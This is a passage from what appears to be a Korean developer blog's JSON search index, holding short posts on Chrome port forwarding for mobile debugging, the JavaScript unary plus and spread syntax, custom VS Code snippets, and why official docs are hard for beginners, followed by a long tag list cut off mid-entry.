보안 컨텍스트가 필요한 Web API의 경우 localhost로 만들어줘야 한다 내부IP:PORT 해서 접속은 할 수 있지만, devicemotion가 정상 동작하려면 localhost여야 한다 상황 데탑에서 웹 개발 진행 중 로컬에서 5500 포트로 웹서버가 열려있음 모바일에서 위 웹서버에 접속하려면 내부아이피:포트를 입력해야함 모바일에서 localhost:5500을 입력해서 접속할 수 있도록 해보자 chrome://inspect/#devices 에 접속한다 내 핸드폰이 잘 연결되었는지 확인한다 포트 포워딩 버튼을 누른다 5500 포트와 localhost:5500을 매칭시켰다 이제 핸드폰 크롬에서 localhost:5500으로 접속하면 웹서버에 접속할 수 있다! 물론 Web API도 모두 잘 동작한다 참고 https://backstreet-programmer.tistory.com/30","link":"/2021/07/01/remote-debug-android-chrome/"},{"title":"unary plus","text":"무엇이든 숫자로 캐스팅하는 연산자 1234567891011121314151617181920212223242526272829console.log(+1);// expected output: 1console.log(+-1);// expected output: -1console.log(+'');// expected output: 0console.log(+true);// expected output: 1console.log(+false);// expected output: 0console.log(+null);// expected output: 0console.log(+'1');// expected output: 1console.log(+'12');// expected output: 12console.log(+'hello');// expected output: NaNconsole.log(+0xff);// expected output: 255 전에 string to number 요상한 문법 (js)이라고 올린 적 있다 그때 사용 했던 +연산자를 unary plus라고 부르는 것을 알게 되었다 이 연산의 반환 값은 숫자다 보통 10진 숫자로 된 문자열을 숫자로 바꿀 때 사용하지만 true, false, null, 16진수 등 다양한 인풋을 지원한다 참고 https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Unary_plus","link":"/2021/07/01/unary-plus/"},{"title":"vscode 나만의 스니펫 만들어서 사용하기","text":"상황 여러 테스트 파일을 만드는데, 기본적으로 작성해야 하는 틀이 있다 기본 틀이 되는 코드를 scaffold.test.ts 파일로 만들어서 내용을 복사해서 사용하거나, 복사본을 만들면서 새로운 테스트 파일들을 생성했다 반복하다 보니까 이마저도 불편했다 그러다가 커스텀 스니펫을 만들기로 한다 목표 123456789/** * problem */describe('id', () =&gt; { test('should ', () =&gt; { expect(solution(prams)).toEqual(er); });}); 내 목표는 te를 입력하면 내가 등록한 스니펫을 통해 위 코드를 완성시킬 것이다 스니펫 만들기 상단바에서 File &gt; Preferences &gt; User Snippets 을 선택한다 어떤 언어에서 만들 것인지 선택한다 나는 타입스크립트에서 사용할 것이다 그러면 %userprofile%\\AppData\\Roaming\\Code\\User\\snippets\\typescript.json이라는 파일이 생성되고 설명과 예제가 나와있다 %userprofile%\\AppData\\Roaming\\Code\\User\\snippets\\typescript.json1234567891011121314151617181920212223{ // Place your snippets for typescript here. Each snippet is defined under a snippet name and has a prefix, body and // description. The prefix is what is used to trigger the snippet and the body will be expanded and inserted. Possible variables are: // $1, $2 for tab stops, $0 for the final cursor position, and ${1:label}, ${2:another} for placeholders. Placeholders with the // same ids are connected. // Example: &quot;cotejs test&quot;: { &quot;prefix&quot;: &quot;te&quot;, &quot;body&quot;: [ &quot;/**&quot;, &quot;* ${1:problem}&quot;, &quot;*/&quot;, &quot;&quot;, &quot;describe('${2:id}', () =&gt; {&quot;, &quot;$0&quot;, &quot; test('should ', () =&gt; {&quot;, &quot; expect(solution(${3:prams})).toEqual(er);&quot;, &quot; });&quot;, &quot;});&quot; ], &quot;description&quot;: &quot;base&quot; }} prefix ; 나는 te로 설정했다. 스니펫이 어떤 문자열에 추천될지 설정하는 곳이다 body ; 내가 완성시키고 싶은 스니펫을 등록한다. 줄 바꿈을 기준으로 배열로 쪼개 줘야 한다 description ; 스니펫에 대한 설명을 적는다 특히 자동 완성할 때 tab를 누르면 커서가 원하는 순서로 이동하게 할 수 있다 $1, $2, $3,..., $n, $0을 통해서 가능하다 각 커서에 기본값을 추가하고 싶으면 ${1:one} 이런 식으로 가능하다 $0은 마지막 커서 위치를 설정할 수 있다 참고 https://code.visualstudio.com/docs/editor/userdefinedsnippets#_create-your-own-snippets","link":"/2021/07/02/vscode-custom-snippet/"},{"title":"공식문서가 어려운 이유","text":"처음 웹 개발을 공부하기 시작할 때 mdn보다 w3school을 가게되는지… 공식문서가 어려운 이유 모르는 걸 모르게 설명한다 엄청 디테일해서 TMI다 엄청 생략된 예제 영어 모르는 걸 모르게 설명한다 공식 문서를 작성하시는 분들은 당연히도 그 기술에 대해 빠삭하신 분들이다 해당 기술을 잘 알고 있는 사람들한테는 최고의 문서일 것이다 하지만 초보가 문서를 읽었을 때 개발 경험 부족으로 센스가 부족해서 아주 간단한 것일지라도 막힐 때가 있다 사전에서 어떤 단어를 찾았는데 그 단어가 또다시 모르는 단어로 설명되어 있는 느낌 엄청 디테일해서 TMI다 나는 빨리 헬로월드를 출력하고 싶은데, 뭔가 글이 길고 복잡해 보인다 install 할 때 여러 옵션들, cli 명령어의 여러 옵션들 등 실행만 하는데도 너무 어려울 것 같은 인상을 준다 나는 보통 스크롤이 길고 빼곡한 줄글이 있으면 탈주가 하고 싶다 엄청 생략된 예제 프로젝트 세팅 및 디렉터리 구조 등 생략된 것이 많이 있다 처음 접할 때 내가 튜토리얼을 잘 따라가고 있는지 의문이 들 때가 많이 있다 명령어를 실행해야 하는 디렉터리가 어디인지 어디에 파일을 생성해야 하는지 프로젝트 세팅을 어떻게 해야 하는지 알고 보면 너무 당연한 베이스지만 초보라면 그것조차 너무 어렵다 ㅠㅠ 영어 안 그래도 무슨 말인지 잘 모르는데 영어 ㅠㅠ 기술 용어들이 많아서 번역을 써도 이상한 경우가 많이 있다 생각 공식문서를 보는 게 좋다 주변에서 들었지만 나는 공식문서 보다가 ctrl w를 누른 적이 너무 많다 요즘에야 많이 익숙해지고 센스도 늘어서 공식문서를 예전보다는 많이 읽는 편이다 하지만 요즘도 처음 사용하는 라이브러리라든가 빠른 프로젝트 적용 또는 시작을 위해 youtube를 참고한다 영상만큼 직관적인 게 없다고 생각한다 정적인 문서로는 초보자를 이해시키는 게 어렵다 영상은 변경사항을 업데이트하기가 어려운 단점이 있다 영상 제작은 아무래도 노력이 많이 필요하다","link":"/2021/07/01/why-official-docs-difficult/"},{"title":"js spread syntax &#96;...&#96; 연산자","text":"123456const arr = [1, 2, 3];console.log(arr); // [1,2,3]console.log(...arr); // 1 2 3console.log(1, 2, 3); // 1 2 3console.log([...arr]); // [1,2,3]console.log(arr === [...arr]); // false 리액트를 처음 시작할 때, 상태를 변경하려면, 완전히 새로운 객체를 대입시켜줘야 한다 리액트를 처음 공부할 때 자주 접하면서 알게 된 연산자다 자바스크립트에는 괴랄한 문법이 많구나 느꼈었다 한 꺼풀 벗겨내는 연산자라고 생각하면 쉽다 배열에서 사용123456789101112131415161718192021222324252627282930313233// 함수 인자 넘기기{ const pram = [1, 2]; function add(a, b) { return a + b; } add(...pram); // === add(1, 2); // 3}// 함수 파라미터{ const pram = [1, 2, 3, 4, 5]; function add2(...args) { return args.reduce((p, c) =&gt; p + c, 0); } const result1 = add2(...pram); console.log(result1); const result2 = add2(10, 20, 30); console.log(result2);}// 배열 이어 붙이기{ const prefix = 111; const subfix = 999; const arr = [1, 2, 3]; const newArr = [prefix, ...arr, subfix]; console.log(newArr); // [111, 1, 2, 3, 999]} 객체에서 사용123456789101112131415// 객체 복사 및 값 일부 수정{ const obj = { a: 1, b: 2, }; const newObj = { ...obj, b: 10, }; console.log(obj === newObj); // false console.log(obj); // b===2 console.log(newObj); // b===10} 참고 https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax","link":"/2021/07/07/js-spread-syntax/"}],"tags":[{"name":"nodejs","slug":"nodejs","link":"/tags/nodejs/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"array","slug":"array","link":"/tags/array/"},{"name":"hashmap","slug":"hashmap","link":"/tags/hashmap/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"react","slug":"react","link":"/tags/react/"},{"name":"hook","slug":"hook","link":"/tags/hook/"},{"name":"programmers","slug":"programmers","link":"/tags/programmers/"},{"name":"프로그래머스","slug":"프로그래머스","link":"/tags/%ED%94%84%EB%A1%9C%EA%B7%B8%EB%9E%98%EB%A8%B8%EC%8A%A4/"},{"name":"javascript","slug":"javascript","link":"/tags/javascript/"},{"name":"blog history","slug":"blog-history","link":"/tags/blog-history/"},{"name":"google search console","slug":"google-search-console","link":"/tags/google-search-console/"},{"name":"aws","slug":"aws","link":"/tags/aws/"},{"name":"elb","slug":"elb","link":"/tags/elb/"},{"name":"express","slug":"express","link":"/tags/express/"},{"name":"morgan","slug":"morgan","link":"/tags/morgan/"},{"name":"acl","slug":"acl","link":"/tags/acl/"},{"name":"network","slug":"network","link":"/tags/network/"},{"name":"vpc","slug":"vpc","link":"/tags/vpc/"},{"name":"sg","slug":"sg","link":"/tags/sg/"},{"name":"security groups","slug":"security-groups","link":"/tags/security-groups/"},{"name":"windows","slug":"windows","link":"/tags/windows/"},{"name":"Antimalware Service Executable","slug":"Antimalware-Service-Executable","link":"/tags/Antimalware-Service-Executable/"},{"name":"ts","slug":"ts","link":"/tags/ts/"},{"name":"typescript","slug":"typescript","link":"/tags/typescript/"},{"name":"clone coding","slug":"clone-coding","link":"/tags/clone-coding/"},{"name":"클론코딩","slug":"클론코딩","link":"/tags/%ED%81%B4%EB%A1%A0%EC%BD%94%EB%94%A9/"},{"name":"eslint","slug":"eslint","link":"/tags/eslint/"},{"name":"tsconfig","slug":"tsconfig","link":"/tags/tsconfig/"},{"name":"react-jsx","slug":"react-jsx","link":"/tags/react-jsx/"},{"name":"clamp","slug":"clamp","link":"/tags/clamp/"},{"name":"sql","slug":"sql","link":"/tags/sql/"},{"name":"rds","slug":"rds","link":"/tags/rds/"},{"name":"db","slug":"db","link":"/tags/db/"},{"name":"grant","slug":"grant","link":"/tags/grant/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"stringify","slug":"stringify","link":"/tags/stringify/"},{"name":"json","slug":"json","link":"/tags/json/"},{"name":"vscode","slug":"vscode","link":"/tags/vscode/"},{"name":"Live Share","slug":"Live-Share","link":"/tags/Live-Share/"},{"name":"extension","slug":"extension","link":"/tags/extension/"},{"name":"비동기","slug":"비동기","link":"/tags/%EB%B9%84%EB%8F%99%EA%B8%B0/"},{"name":"async","slug":"async","link":"/tags/async/"},{"name":"await","slug":"await","link":"/tags/await/"},{"name":"resolve","slug":"resolve","link":"/tags/resolve/"},{"name":"reject","slug":"reject","link":"/tags/reject/"},{"name":"security group","slug":"security-group","link":"/tags/security-group/"},{"name":"formatter","slug":"formatter","link":"/tags/formatter/"},{"name":"repl","slug":"repl","link":"/tags/repl/"},{"name":"select tag","slug":"select-tag","link":"/tags/select-tag/"},{"name":"scss","slug":"scss","link":"/tags/scss/"},{"name":"highway js","slug":"highway-js","link":"/tags/highway-js/"},{"name":"gsap","slug":"gsap","link":"/tags/gsap/"},{"name":"parcel","slug":"parcel","link":"/tags/parcel/"},{"name":"github","slug":"github","link":"/tags/github/"},{"name":"svg","slug":"svg","link":"/tags/svg/"},{"name":"freepik","slug":"freepik","link":"/tags/freepik/"},{"name":"flaticon","slug":"flaticon","link":"/tags/flaticon/"},{"name":"java","slug":"java","link":"/tags/java/"},{"name":"sysout","slug":"sysout","link":"/tags/sysout/"},{"name":"typedoc","slug":"typedoc","link":"/tags/typedoc/"},{"name":"tsdoc","slug":"tsdoc","link":"/tags/tsdoc/"},{"name":"a tag","slug":"a-tag","link":"/tags/a-tag/"},{"name":"css","slug":"css","link":"/tags/css/"},{"name":"hexo","slug":"hexo","link":"/tags/hexo/"},{"name":"ec2","slug":"ec2","link":"/tags/ec2/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"keypair","slug":"keypair","link":"/tags/keypair/"},{"name":"remote","slug":"remote","link":"/tags/remote/"},{"name":"pem","slug":"pem","link":"/tags/pem/"},{"name":"lambda","slug":"lambda","link":"/tags/lambda/"},{"name":"cors","slug":"cors","link":"/tags/cors/"},{"name":"sam","slug":"sam","link":"/tags/sam/"},{"name":"ssh","slug":"ssh","link":"/tags/ssh/"},{"name":"category","slug":"category","link":"/tags/category/"},{"name":"boilerplate","slug":"boilerplate","link":"/tags/boilerplate/"},{"name":"chrome dev tool","slug":"chrome-dev-tool","link":"/tags/chrome-dev-tool/"},{"name":"chrome","slug":"chrome","link":"/tags/chrome/"},{"name":"debugger","slug":"debugger","link":"/tags/debugger/"},{"name":"관리자 권한","slug":"관리자-권한","link":"/tags/%EA%B4%80%EB%A6%AC%EC%9E%90-%EA%B6%8C%ED%95%9C/"},{"name":"setTimeout","slug":"setTimeout","link":"/tags/setTimeout/"},{"name":"setInterval","slug":"setInterval","link":"/tags/setInterval/"},{"name":"cidr","slug":"cidr","link":"/tags/cidr/"},{"name":"subnet mask","slug":"subnet-mask","link":"/tags/subnet-mask/"},{"name":"cmd","slug":"cmd","link":"/tags/cmd/"},{"name":"taskkill","slug":"taskkill","link":"/tags/taskkill/"},{"name":"process","slug":"process","link":"/tags/process/"},{"name":"bat","slug":"bat","link":"/tags/bat/"},{"name":"batch file","slug":"batch-file","link":"/tags/batch-file/"},{"name":"관리자 권한 실행","slug":"관리자-권한-실행","link":"/tags/%EA%B4%80%EB%A6%AC%EC%9E%90-%EA%B6%8C%ED%95%9C-%EC%8B%A4%ED%96%89/"},{"name":"rmdir","slug":"rmdir","link":"/tags/rmdir/"},{"name":"mkdir","slug":"mkdir","link":"/tags/mkdir/"},{"name":"mysql","slug":"mysql","link":"/tags/mysql/"},{"name":"mysql2","slug":"mysql2","link":"/tags/mysql2/"},{"name":"connection","slug":"connection","link":"/tags/connection/"},{"name":"connection pool","slug":"connection-pool","link":"/tags/connection-pool/"},{"name":"console.log","slug":"console-log","link":"/tags/console-log/"},{"name":"log","slug":"log","link":"/tags/log/"},{"name":"copy con","slug":"copy-con","link":"/tags/copy-con/"},{"name":"new file","slug":"new-file","link":"/tags/new-file/"},{"name":"crlf","slug":"crlf","link":"/tags/crlf/"},{"name":"lf","slug":"lf","link":"/tags/lf/"},{"name":"important","slug":"important","link":"/tags/important/"},{"name":"prettier","slug":"prettier","link":"/tags/prettier/"},{"name":"style order","slug":"style-order","link":"/tags/style-order/"},{"name":"docker hub","slug":"docker-hub","link":"/tags/docker-hub/"},{"name":"push","slug":"push","link":"/tags/push/"},{"name":"disqus","slug":"disqus","link":"/tags/disqus/"},{"name":"https","slug":"https","link":"/tags/https/"},{"name":"ssl","slug":"ssl","link":"/tags/ssl/"},{"name":"freenom","slug":"freenom","link":"/tags/freenom/"},{"name":"cloudflare","slug":"cloudflare","link":"/tags/cloudflare/"},{"name":"geolocation","slug":"geolocation","link":"/tags/geolocation/"},{"name":"em","slug":"em","link":"/tags/em/"},{"name":"rem","slug":"rem","link":"/tags/rem/"},{"name":"airbnb","slug":"airbnb","link":"/tags/airbnb/"},{"name":"prefer-template","slug":"prefer-template","link":"/tags/prefer-template/"},{"name":"fetch","slug":"fetch","link":"/tags/fetch/"},{"name":"ajax","slug":"ajax","link":"/tags/ajax/"},{"name":"firebase","slug":"firebase","link":"/tags/firebase/"},{"name":"firebase-tools","slug":"firebase-tools","link":"/tags/firebase-tools/"},{"name":"style","slug":"style","link":"/tags/style/"},{"name":"html","slug":"html","link":"/tags/html/"},{"name":"flex box","slug":"flex-box","link":"/tags/flex-box/"},{"name":"branch","slug":"branch","link":"/tags/branch/"},{"name":"forEach","slug":"forEach","link":"/tags/forEach/"},{"name":"clone","slug":"clone","link":"/tags/clone/"},{"name":"depth","slug":"depth","link":"/tags/depth/"},{"name":"commit","slug":"commit","link":"/tags/commit/"},{"name":"alias","slug":"alias","link":"/tags/alias/"},{"name":"github api","slug":"github-api","link":"/tags/github-api/"},{"name":"commits","slug":"commits","link":"/tags/commits/"},{"name":"blog","slug":"blog","link":"/tags/blog/"},{"name":"google analytics","slug":"google-analytics","link":"/tags/google-analytics/"},{"name":"icarus","slug":"icarus","link":"/tags/icarus/"},{"name":"google api","slug":"google-api","link":"/tags/google-api/"},{"name":"web font","slug":"web-font","link":"/tags/web-font/"},{"name":"readme.md","slug":"readme-md","link":"/tags/readme-md/"},{"name":"bare","slug":"bare","link":"/tags/bare/"},{"name":"mirror","slug":"mirror","link":"/tags/mirror/"},{"name":"gitignore","slug":"gitignore","link":"/tags/gitignore/"},{"name":"gradle","slug":"gradle","link":"/tags/gradle/"},{"name":"build.gradle","slug":"build-gradle","link":"/tags/build-gradle/"},{"name":"lib","slug":"lib","link":"/tags/lib/"},{"name":"styl","slug":"styl","link":"/tags/styl/"},{"name":"db.json","slug":"db-json","link":"/tags/db-json/"},{"name":"tag pulgin","slug":"tag-pulgin","link":"/tags/tag-pulgin/"},{"name":"youtube","slug":"youtube","link":"/tags/youtube/"},{"name":"youtube playlist","slug":"youtube-playlist","link":"/tags/youtube-playlist/"},{"name":"md","slug":"md","link":"/tags/md/"},{"name":"markdown","slug":"markdown","link":"/tags/markdown/"},{"name":"draft","slug":"draft","link":"/tags/draft/"},{"name":"layout","slug":"layout","link":"/tags/layout/"},{"name":"gist","slug":"gist","link":"/tags/gist/"},{"name":"code snippet","slug":"code-snippet","link":"/tags/code-snippet/"},{"name":"inline styles","slug":"inline-styles","link":"/tags/inline-styles/"},{"name":"input","slug":"input","link":"/tags/input/"},{"name":"spellCheck","slug":"spellCheck","link":"/tags/spellCheck/"},{"name":"timestamp","slug":"timestamp","link":"/tags/timestamp/"},{"name":"on update","slug":"on-update","link":"/tags/on-update/"},{"name":"CURRENT_TIMESTAMP","slug":"CURRENT-TIMESTAMP","link":"/tags/CURRENT-TIMESTAMP/"},{"name":"gc","slug":"gc","link":"/tags/gc/"},{"name":"garbage collector","slug":"garbage-collector","link":"/tags/garbage-collector/"},{"name":"javadoc","slug":"javadoc","link":"/tags/javadoc/"},{"name":"bind","slug":"bind","link":"/tags/bind/"},{"name":"kakao api","slug":"kakao-api","link":"/tags/kakao-api/"},{"name":"substr","slug":"substr","link":"/tags/substr/"},{"name":"fs","slug":"fs","link":"/tags/fs/"},{"name":"keyboardevent","slug":"keyboardevent","link":"/tags/keyboardevent/"},{"name":"li tag","slug":"li-tag","link":"/tags/li-tag/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"nohup","slug":"nohup","link":"/tags/nohup/"},{"name":"shutdown","slug":"shutdown","link":"/tags/shutdown/"},{"name":"readme","slug":"readme","link":"/tags/readme/"},{"name":"momentjs","slug":"momentjs","link":"/tags/momentjs/"},{"name":"npm","slug":"npm","link":"/tags/npm/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"webview","slug":"webview","link":"/tags/webview/"},{"name":"intent","slug":"intent","link":"/tags/intent/"},{"name":"nofollow","slug":"nofollow","link":"/tags/nofollow/"},{"name":"abi","slug":"abi","link":"/tags/abi/"},{"name":"inspect","slug":"inspect","link":"/tags/inspect/"},{"name":"__dirname","slug":"dirname","link":"/tags/dirname/"},{"name":"process.cwd()","slug":"process-cwd","link":"/tags/process-cwd/"},{"name":"app-root-path","slug":"app-root-path","link":"/tags/app-root-path/"},{"name":"socketio","slug":"socketio","link":"/tags/socketio/"},{"name":"dockerizing","slug":"dockerizing","link":"/tags/dockerizing/"},{"name":"mariadb","slug":"mariadb","link":"/tags/mariadb/"},{"name":"sqldump","slug":"sqldump","link":"/tags/sqldump/"},{"name":"nodemon","slug":"nodemon","link":"/tags/nodemon/"},{"name":"watch","slug":"watch","link":"/tags/watch/"},{"name":"cli","slug":"cli","link":"/tags/cli/"},{"name":"unpublish","slug":"unpublish","link":"/tags/unpublish/"},{"name":"otp","slug":"otp","link":"/tags/otp/"},{"name":"crypto","slug":"crypto","link":"/tags/crypto/"},{"name":"sha1","slug":"sha1","link":"/tags/sha1/"},{"name":"HMAC hash","slug":"HMAC-hash","link":"/tags/HMAC-hash/"},{"name":"playlist","slug":"playlist","link":"/tags/playlist/"},{"name":"music","slug":"music","link":"/tags/music/"},{"name":"api","slug":"api","link":"/tags/api/"},{"name":"비용","slug":"비용","link":"/tags/%EB%B9%84%EC%9A%A9/"},{"name":"key prop","slug":"key-prop","link":"/tags/key-prop/"},{"name":"airbnb react","slug":"airbnb-react","link":"/tags/airbnb-react/"},{"name":"setting.json","slug":"setting-json","link":"/tags/setting-json/"},{"name":"setting","slug":"setting","link":"/tags/setting/"},{"name":"formatOnSave","slug":"formatOnSave","link":"/tags/formatOnSave/"},{"name":"url params","slug":"url-params","link":"/tags/url-params/"},{"name":"moment","slug":"moment","link":"/tags/moment/"},{"name":"useState","slug":"useState","link":"/tags/useState/"},{"name":"Map","slug":"Map","link":"/tags/Map/"},{"name":"emmet","slug":"emmet","link":"/tags/emmet/"},{"name":"swift","slug":"swift","link":"/tags/swift/"},{"name":"ImageFinder","slug":"ImageFinder","link":"/tags/ImageFinder/"},{"name":"rest api","slug":"rest-api","link":"/tags/rest-api/"},{"name":"template.yaml","slug":"template-yaml","link":"/tags/template-yaml/"},{"name":"api gateway","slug":"api-gateway","link":"/tags/api-gateway/"},{"name":"placehold","slug":"placehold","link":"/tags/placehold/"},{"name":"sample image","slug":"sample-image","link":"/tags/sample-image/"},{"name":"layer","slug":"layer","link":"/tags/layer/"},{"name":"sass","slug":"sass","link":"/tags/sass/"},{"name":"scrollbar","slug":"scrollbar","link":"/tags/scrollbar/"},{"name":"promise","slug":"promise","link":"/tags/promise/"},{"name":"shell script","slug":"shell-script","link":"/tags/shell-script/"},{"name":"bash","slug":"bash","link":"/tags/bash/"},{"name":"dirpath","slug":"dirpath","link":"/tags/dirpath/"},{"name":"terminal","slug":"terminal","link":"/tags/terminal/"},{"name":"shell","slug":"shell","link":"/tags/shell/"},{"name":"tabindex","slug":"tabindex","link":"/tags/tabindex/"},{"name":"ts-node","slug":"ts-node","link":"/tags/ts-node/"},{"name":"type","slug":"type","link":"/tags/type/"},{"name":"interface","slug":"interface","link":"/tags/interface/"},{"name":"import","slug":"import","link":"/tags/import/"},{"name":"es6","slug":"es6","link":"/tags/es6/"},{"name":"mathjs","slug":"mathjs","link":"/tags/mathjs/"},{"name":"ubuntu ami","slug":"ubuntu-ami","link":"/tags/ubuntu-ami/"},{"name":"vim","slug":"vim","link":"/tags/vim/"},{"name":"snippets","slug":"snippets","link":"/tags/snippets/"},{"name":"files.exclude","slug":"files-exclude","link":"/tags/files-exclude/"},{"name":"search.exclude","slug":"search-exclude","link":"/tags/search-exclude/"},{"name":"단축키","slug":"단축키","link":"/tags/%EB%8B%A8%EC%B6%95%ED%82%A4/"},{"name":"터미널","slug":"터미널","link":"/tags/%ED%84%B0%EB%AF%B8%EB%84%90/"},{"name":"sort lines","slug":"sort-lines","link":"/tags/sort-lines/"},{"name":"workspace","slug":"workspace","link":"/tags/workspace/"},{"name":"jsconfig","slug":"jsconfig","link":"/tags/jsconfig/"},{"name":"absolute path","slug":"absolute-path","link":"/tags/absolute-path/"},{"name":"관리자권한","slug":"관리자권한","link":"/tags/%EA%B4%80%EB%A6%AC%EC%9E%90%EA%B6%8C%ED%95%9C/"},{"name":"markdown open preview","slug":"markdown-open-preview","link":"/tags/markdown-open-preview/"},{"name":"location","slug":"location","link":"/tags/location/"},{"name":"webfont","slug":"webfont","link":"/tags/webfont/"},{"name":"install","slug":"install","link":"/tags/install/"},{"name":"yarn","slug":"yarn","link":"/tags/yarn/"},{"name":"limit","slug":"limit","link":"/tags/limit/"},{"name":"pagination","slug":"pagination","link":"/tags/pagination/"},{"name":"thumbnail","slug":"thumbnail","link":"/tags/thumbnail/"},{"name":"github readme stats","slug":"github-readme-stats","link":"/tags/github-readme-stats/"},{"name":"special repository","slug":"special-repository","link":"/tags/special-repository/"},{"name":"github profile","slug":"github-profile","link":"/tags/github-profile/"},{"name":"profile","slug":"profile","link":"/tags/profile/"},{"name":"seo","slug":"seo","link":"/tags/seo/"},{"name":"search engine optimization","slug":"search-engine-optimization","link":"/tags/search-engine-optimization/"},{"name":"flex","slug":"flex","link":"/tags/flex/"},{"name":"생각","slug":"생각","link":"/tags/%EC%83%9D%EA%B0%81/"},{"name":"도로명 주소","slug":"도로명-주소","link":"/tags/%EB%8F%84%EB%A1%9C%EB%AA%85-%EC%A3%BC%EC%86%8C/"},{"name":"open api","slug":"open-api","link":"/tags/open-api/"},{"name":"Math","slug":"Math","link":"/tags/Math/"},{"name":"random","slug":"random","link":"/tags/random/"},{"name":"local start api","slug":"local-start-api","link":"/tags/local-start-api/"},{"name":"github pages","slug":"github-pages","link":"/tags/github-pages/"},{"name":"scan","slug":"scan","link":"/tags/scan/"},{"name":"reset","slug":"reset","link":"/tags/reset/"},{"name":"og image","slug":"og-image","link":"/tags/og-image/"},{"name":"img","slug":"img","link":"/tags/img/"},{"name":"logo","slug":"logo","link":"/tags/logo/"},{"name":"avatar","slug":"avatar","link":"/tags/avatar/"},{"name":"favicon","slug":"favicon","link":"/tags/favicon/"},{"name":"symbolic link","slug":"symbolic-link","link":"/tags/symbolic-link/"},{"name":"mklink","slug":"mklink","link":"/tags/mklink/"},{"name":"public","slug":"public","link":"/tags/public/"},{"name":".deploy_git","slug":"deploy-git","link":"/tags/deploy-git/"},{"name":"github.io","slug":"github-io","link":"/tags/github-io/"},{"name":"gradient","slug":"gradient","link":"/tags/gradient/"},{"name":"스샷","slug":"스샷","link":"/tags/%EC%8A%A4%EC%83%B7/"},{"name":"스크린샷","slug":"스크린샷","link":"/tags/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7/"},{"name":"win v","slug":"win-v","link":"/tags/win-v/"},{"name":"explorer","slug":"explorer","link":"/tags/explorer/"},{"name":"electron","slug":"electron","link":"/tags/electron/"},{"name":"iohook","slug":"iohook","link":"/tags/iohook/"},{"name":"input overlay","slug":"input-overlay","link":"/tags/input-overlay/"},{"name":"reg exp","slug":"reg-exp","link":"/tags/reg-exp/"},{"name":"정보처리기사","slug":"정보처리기사","link":"/tags/%EC%A0%95%EB%B3%B4%EC%B2%98%EB%A6%AC%EA%B8%B0%EC%82%AC/"},{"name":"tags","slug":"tags","link":"/tags/tags/"},{"name":"categories","slug":"categories","link":"/tags/categories/"},{"name":"이미지 검색","slug":"이미지-검색","link":"/tags/%EC%9D%B4%EB%AF%B8%EC%A7%80-%EA%B2%80%EC%83%89/"},{"name":"다음 검색","slug":"다음-검색","link":"/tags/%EB%8B%A4%EC%9D%8C-%EA%B2%80%EC%83%89/"},{"name":"정규식","slug":"정규식","link":"/tags/%EC%A0%95%EA%B7%9C%EC%8B%9D/"},{"name":"regexp","slug":"regexp","link":"/tags/regexp/"},{"name":"regular expression","slug":"regular-expression","link":"/tags/regular-expression/"},{"name":"404","slug":"404","link":"/tags/404/"},{"name":"custom page","slug":"custom-page","link":"/tags/custom-page/"},{"name":"콜라츠 추측","slug":"콜라츠-추측","link":"/tags/%EC%BD%9C%EB%9D%BC%EC%B8%A0-%EC%B6%94%EC%B8%A1/"},{"name":"타자속도","slug":"타자속도","link":"/tags/%ED%83%80%EC%9E%90%EC%86%8D%EB%8F%84/"},{"name":"telegram","slug":"telegram","link":"/tags/telegram/"},{"name":"bot","slug":"bot","link":"/tags/bot/"},{"name":"chat bot","slug":"chat-bot","link":"/tags/chat-bot/"},{"name":"telegram bot","slug":"telegram-bot","link":"/tags/telegram-bot/"},{"name":"is-port-reachable","slug":"is-port-reachable","link":"/tags/is-port-reachable/"},{"name":"box-sizing","slug":"box-sizing","link":"/tags/box-sizing/"},{"name":"curtime","slug":"curtime","link":"/tags/curtime/"},{"name":"date_format","slug":"date-format","link":"/tags/date-format/"},{"name":"utc","slug":"utc","link":"/tags/utc/"},{"name":"version","slug":"version","link":"/tags/version/"},{"name":"date","slug":"date","link":"/tags/date/"},{"name":"datetime","slug":"datetime","link":"/tags/datetime/"},{"name":"git-filter-repo","slug":"git-filter-repo","link":"/tags/git-filter-repo/"},{"name":"emojipedia","slug":"emojipedia","link":"/tags/emojipedia/"},{"name":"grid","slug":"grid","link":"/tags/grid/"},{"name":"ON DUPLICATE KEY","slug":"ON-DUPLICATE-KEY","link":"/tags/ON-DUPLICATE-KEY/"},{"name":"pandoc","slug":"pandoc","link":"/tags/pandoc/"},{"name":"shellLauncher","slug":"shellLauncher","link":"/tags/shellLauncher/"},{"name":"jar","slug":"jar","link":"/tags/jar/"},{"name":"cdn","slug":"cdn","link":"/tags/cdn/"},{"name":"jsdelivr","slug":"jsdelivr","link":"/tags/jsdelivr/"},{"name":"submodule","slug":"submodule","link":"/tags/submodule/"},{"name":"not not","slug":"not-not","link":"/tags/not-not/"},{"name":"parseInt","slug":"parseInt","link":"/tags/parseInt/"},{"name":"Math.floor","slug":"Math-floor","link":"/tags/Math-floor/"},{"name":"scope","slug":"scope","link":"/tags/scope/"},{"name":"scope chain","slug":"scope-chain","link":"/tags/scope-chain/"},{"name":"lexical scoping","slug":"lexical-scoping","link":"/tags/lexical-scoping/"},{"name":"aws cli","slug":"aws-cli","link":"/tags/aws-cli/"},{"name":"aws sam cli","slug":"aws-sam-cli","link":"/tags/aws-sam-cli/"},{"name":"Math.max","slug":"Math-max","link":"/tags/Math-max/"},{"name":"arn","slug":"arn","link":"/tags/arn/"},{"name":"credentials","slug":"credentials","link":"/tags/credentials/"},{"name":"sam cli","slug":"sam-cli","link":"/tags/sam-cli/"},{"name":"react-table","slug":"react-table","link":"/tags/react-table/"},{"name":"styled components","slug":"styled-components","link":"/tags/styled-components/"},{"name":"context","slug":"context","link":"/tags/context/"},{"name":"dark 